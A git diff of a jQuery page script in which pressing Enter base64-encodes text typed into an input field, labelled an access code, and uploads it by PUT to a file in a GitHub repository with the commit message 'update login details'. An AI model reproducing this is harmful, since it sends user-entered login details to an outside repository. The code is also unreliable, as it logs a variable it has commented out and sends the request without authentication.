@@ -19,25 +19,33 @@ $(document).ready(()=> {
       console.log('Enter was hit!');
       setOBJ();
 
-      var uploadURL ="https://api.github.com/repos/EllexideBot/Config-Files/git/blobs/8b137891791fe96927ad78e64b0aad7bded08bdc" + base64 + partOne + partTwo;
+  //    var uploadURL ="https://api.github.com/repos/EllexideBot/Config-Files/git/blobs/8b137891791fe96927ad78e64b0aad7bded08bdc" + base64 + partOne + partTwo;
       var text = $('#inputcmd').val();
       console.log(uploadURL);
 
       obj.hello.accessCode = text;
       hitCount ++;
-      var request = new XMLHttpRequest();
+      
+      var content = btoa(text);
 
-      request.open("PUT", uploadURL, true);
-      request.setRequestHeader('Content-type', 'application/json; charset=utf-8');
-      request.onload = function () {
-        var response = JSON.parse(request.responseText);
-        if (request.readyState == 4 && request.status == "200") {
-          console.table(response);
-        } else {
-          console.error(response);
-        }
-      }
-      request.send(obj);
+      $.ajax({
+        type: "PUT",
+        url:"https://api.github.com/repos/redemption23/trackerApp/contents/file.txt",
+        contentType: "application/json",
+        dataType: "json",
+        data: {
+            "message": "update login details",
+            "committer": {
+              "name": "EllexideCodes",
+              "email": "ellexidecodes@gmail.com"
+            },
+            "content": content,
+            "sha": "8b137891791fe96927ad78e64b0aad7bded08bdc"
+          }
+      })
+        .done(function( data ) {
+          console.log( data );
+        });
     } else if (e.keyCode == 13 && hitCount == 1) {
       console.log('Here\'s your access code');
       hitCount --;
